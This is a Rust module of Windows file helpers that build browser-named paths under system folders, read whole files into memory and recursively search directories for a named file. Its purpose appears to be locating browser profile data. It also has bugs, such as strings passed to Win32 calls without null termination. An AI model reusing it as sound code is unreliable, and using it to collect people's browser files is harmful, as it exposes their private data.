use crate::import_libs::*;
use std::ffi::{c_char, c_void, CStr, CString};
use std::fs;
use std::io;
use std::io::Write;
use std::str::from_utf8;
use windows::core::PCSTR;
use windows::Win32::Storage::FileSystem::{FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_MODE};
use windows::Win32::System::Memory::HEAP_FLAGS;

fn is_file_empty(file_path: &str) -> io::Result<bool> {
    let metadata = fs::metadata(file_path)?;

    let file_size = metadata.len();

    Ok(file_size == 0)
}
pub unsafe fn get_file_path(browser_name: &str, filename: &str, csidl: u32) -> String {
    let pszpath: &mut [u8; 260] = &mut [0; 260];
    let result = SHGetFolderPathA(HWND::default(), csidl as i32, HANDLE::default(), 0, pszpath);
    if result.is_err() {
        return String::default();
    }
    let mut file_path = String::default();
    file_path += from_utf8(pszpath).unwrap().split('\0').next().unwrap_or("");
    file_path += browser_name;
    file_path += filename;
    return file_path;
}

pub unsafe fn is_file_exists(file_path: &str) -> bool {
    let file_attriutes = GetFileAttributesA(PCSTR::from_raw(file_path.as_ptr()));
    if file_attriutes == INVALID_FILE_ATTRIBUTES {
        return false;
    }
    return true;
}

pub unsafe fn read_file2buffer(
    file_path: &str,
    lpbuffer: &mut *mut c_void,
    file_size: &mut u32,
) -> bool {
    let result = CreateFileA(
        PCSTR::from_raw(file_path.as_ptr()),
        GENERIC_READ.0,
        FILE_SHARE_MODE::default(),
        None,
        OPEN_ALWAYS,
        FILE_FLAGS_AND_ATTRIBUTES::default(),
        HANDLE::default(),
    );

    let file_handle = result.unwrap();
    *file_size = GetFileSize(file_handle, None);
    if *file_size == 0 {
        return false;
    }

    *lpbuffer = HeapAlloc(
        GetProcessHeap().unwrap(),
        HEAP_FLAGS::default(),
        *file_size as usize,
    );
    let mut mut_u8_slice =
        std::slice::from_raw_parts_mut(*lpbuffer as *mut u8, *file_size as usize);
    let result = ReadFile(
        file_handle,
        Some(mut_u8_slice),
        Some(&*file_size as *const u32 as *mut u32),
        None,
    );
    if result.is_err() {
        return false;
    }
    CloseHandle(file_handle);

    true
}

pub unsafe fn search_file(directory: &str, filename: &str) -> Option<String> {
    let mut search_path = format!("{}\\*", directory);
    let search_path_cstring = CString::new(search_path).unwrap();
    let mut find_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA::default();
    let mut find_data_ptr: *mut WIN32_FIND_DATAA = &mut find_data;
    let handle = FindFirstFileA(
        PCSTR::from_raw(search_path_cstring.as_ptr() as *const u8),
        find_data_ptr,
    )
    .unwrap();
    if handle == INVALID_HANDLE_VALUE {
        return None;
    }
    let mut result_path = None;
    loop {
        let filename_str = String::from_utf8_lossy(
            CStr::from_ptr(find_data.cFileName.as_ptr() as *const c_char).to_bytes(),
        )
        .into_owned();
        if filename_str != "." && filename_str != ".." {
            let filepath = format!("{}\\{}", directory, filename_str);
            if find_data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY.0 {
                if let Some(path) = search_file(&filepath, filename) {
                    result_path = Some(path);
                    break;
                }
            } else if filename_str == filename {
                if is_file_empty(&filepath).unwrap() {
                    break;
                } else {
                    result_path = Some(filepath);
                    break;
                }
            }
        }
        let result = FindNextFileA(handle, find_data_ptr);
        if result.is_err() {
            break;
        }
    }
    FindClose(handle);
    result_path
}
